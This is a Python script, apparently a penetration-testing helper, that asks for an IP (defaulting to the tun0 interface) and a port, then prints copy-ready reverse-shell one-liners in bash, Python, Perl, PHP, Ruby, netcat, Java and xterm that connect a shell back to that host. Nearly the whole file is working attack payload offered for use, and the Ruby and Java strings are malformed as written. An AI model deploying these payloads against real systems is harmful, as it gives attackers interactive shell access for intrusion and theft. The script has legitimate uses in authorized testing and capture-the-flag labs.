#!/usr/bin/env python3

'''
Author : udmnxpdu
Language : Python3
'''

import colorama
from colorama import Fore,Style
import os
import subprocess
import sys
from time import sleep

ip = str("NULL")
port = str("NULL")
choice = 0
os.system('clear')
banner = Fore.YELLOW + "\t\t\tREVERSE SHELLS Generator\n"
for i in banner:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.1)
    
def bash():
    print(Fore.GREEN + "\nbash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1")
def python():
    print(Fore.GREEN + "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" %(ip,port))    
def python3():
    print(Fore.GREEN + "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" %(ip,port))
def perl():
    print(Fore.GREEN + "\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ip,port))
def php():
    print(Fore.GREEN + "\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ip,port))
def ruby():
    print(Fore.GREEN + "\nruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'")
def netcat():
    print(Fore.GREEN + "\nnc -e /bin/sh %s %s" %(ip,port))
def java():
    print(Fore.GREEN + '''\n\tr = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()''' %(ip,port))
def xterm():
    print(Fore.GREEN + "\nxterm -display %s:%s" %(ip,port))

def main_menu():
    global choice
    print(Fore.GREEN + "\nThe current ip:="+ip + Fore.GREEN + "\tThe current port:="+port  +"\n" )
    print(Fore.YELLOW + " [1].BASH REVERSE SHELL\n")
    print(Fore.YELLOW + " [2].PYTHON REVERSE SHELL\n")
    print(Fore.YELLOW + " [3].PYTHON3 REVERSE SHELL\n")
    print(Fore.YELLOW + " [4].PERL REVERSE SHELL\n")
    print(Fore.YELLOW + " [5].PHP REVERSE SHELL\n")
    print(Fore.YELLOW + " [6].RUBY REVERSE SHELL\n")
    print(Fore.YELLOW + " [7].NETCAT REVERSE SHELL\n")
    print(Fore.YELLOW + " [8].JAVA REVERSE SHELL\n")
    print(Fore.YELLOW + " [9].XTERM REVERSE SHELL\n")
    print(Fore.YELLOW + "[10].Change IP\n")
    print(Fore.YELLOW + "[11].Change PORT\n")
    print(Fore.RED    + "[12].EXIT\n")
    try :
        choice = int(input(Fore.GREEN + "Enter YOUR CHOICE := "))
    except :
        print("\n\t[-] Invalid Choice\n")
        main_menu()
    print_shell(choice)
def print_shell(choice):
    if choice == 1:
            bash()
    elif(choice == 2):
            python()
    elif(choice == 3):
            python3()
    elif(choice == 4):
            perl()
    elif(choice == 5):
            php()
    elif(choice == 6):
            ruby()
    elif(choice == 7):
            netcat()
    elif(choice == 8):
             java()
    elif(choice == 9):
            xterm()
    elif(choice == 10):
            change_ip()
    elif(choice == 11):
            change_port()
    elif(choice == 12):
            exit(0)
    else:
            print("\n\t[-] Invalid Choice")
            main_menu()

def change_port():
    global port
    port = input(Fore.GREEN + "Enter the new Port:=")
    main_menu()

def change_ip():
    global ip
    ip = input(Fore.GREEN + "Enter the new IP := ")
    main_menu()

def get_ip():
    ip = subprocess.getoutput("ifconfig tun0 2> /dev/null | awk '/inet/ {print $2}' | head -n 1")
    print("\nDefault IP :",ip)
    tmp_ip = input("Enter IP [ Press Enter to Default ] : ")
    if len(tmp_ip) < 8 :
    	print("IP ==> %s" % ip)
    else :
    	print("IP ==> %s" % tmp_ip)
    	ip = tmp_ip
    return ip

def get_port():
    port = "4444"
    print("\nDefault Port :",port)
    tmp_port = input("Enter Port [ Press Enter to Default ] : ")
    if len(tmp_port) < 2 :
    	print("Port ==> %s" % port)
    else :
    	print("Port ==> %s" % tmp_port)
    	port = tmp_port
    return port
ip = str(get_ip())
port = str(get_port())
print("\n\t\tWhich shell you want ?? \n")
main_menu()
print("\n!!! Happy Hacking !!! ")
